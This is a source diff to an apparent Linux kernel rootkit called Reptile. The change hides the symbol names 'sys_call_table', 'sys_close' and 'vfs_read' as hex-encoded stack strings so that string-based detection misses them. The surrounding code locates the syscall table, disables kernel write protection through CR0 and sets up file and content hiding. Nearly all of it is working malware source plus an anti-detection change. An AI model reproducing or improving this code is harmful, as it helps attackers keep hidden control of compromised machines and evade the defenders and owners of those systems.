@@ -50,6 +50,24 @@
 #define SIGHIDEREPTILE 	50
 #define SIGHIDECONTENT  51
 #define SSIZE_MAX 	32767
+#define SYS_CALL_TABLE \
+({ \
+unsigned int *p = (unsigned int*)__builtin_alloca(21); \
+ p[0] = 0x5f737973; \
+ p[1] = 0x6c6c6163; \
+ p[2] = 0x6261745f; \
+ p[3] = 0x0000656c; \
+ (char *)p; \
+})
+
+#define SYS_CLOSE \
+({ \
+unsigned int *p = (unsigned int*)__builtin_alloca(21); \
+ p[0] = 0x5f737973; \
+ p[1] = 0x736f6c63; \
+ p[2] = 0x00000065; \
+ (char *)p; \
+})
 
 int hidden = 0, hide_file_content = 1;
 struct workqueue_struct *work_queue;
@@ -59,7 +77,15 @@ static unsigned long *sct;
 atomic_t read_on;
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
-	#define SYM_NAME "vfs_read"
+	#define VFS_READ \
+	({ \
+	unsigned int *p = (unsigned int*)__builtin_alloca(21); \
+	 p[0] = 0x5f736676; \
+	 p[1] = 0x64616572; \
+	 p[2] = 0x00; \
+	 (char *)p; \
+	})
+
     	asmlinkage size_t (*vfs_read_addr)(struct file *file, char __user *buf, size_t count, loff_t *pos);
 #endif
 
@@ -398,7 +424,7 @@ unsigned long *generic_find_sys_call_table(void){
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
 		if (syscall_table[__NR_close] == (unsigned long)sys_close)
 #else 
-		if (syscall_table[__NR_close] == (unsigned long)kallsyms_lookup_name("sys_close"))
+		if (syscall_table[__NR_close] == (unsigned long)kallsyms_lookup_name(SYS_CLOSE))
 #endif
 			return syscall_table;
 	}
@@ -568,7 +594,7 @@ static int __init reptile_init(void) {
 	atomic_set(&read_on, 0);
 	sct = (unsigned long *)find_sys_call_table();
 
-	if(!sct) sct = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+	if(!sct) sct = (unsigned long *)kallsyms_lookup_name(SYS_CALL_TABLE);
 	if(!sct) sct = (unsigned long *)generic_find_sys_call_table();			
 	if(!sct) return -1;
 	
@@ -598,7 +624,7 @@ static int __init reptile_init(void) {
 	exec(argv);
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
-    	vfs_read_addr = (void *)kallsyms_lookup_name(SYM_NAME);
+    	vfs_read_addr = (void *)kallsyms_lookup_name(VFS_READ);
 #endif
 
 	write_cr0(read_cr0() & (~0x10000));
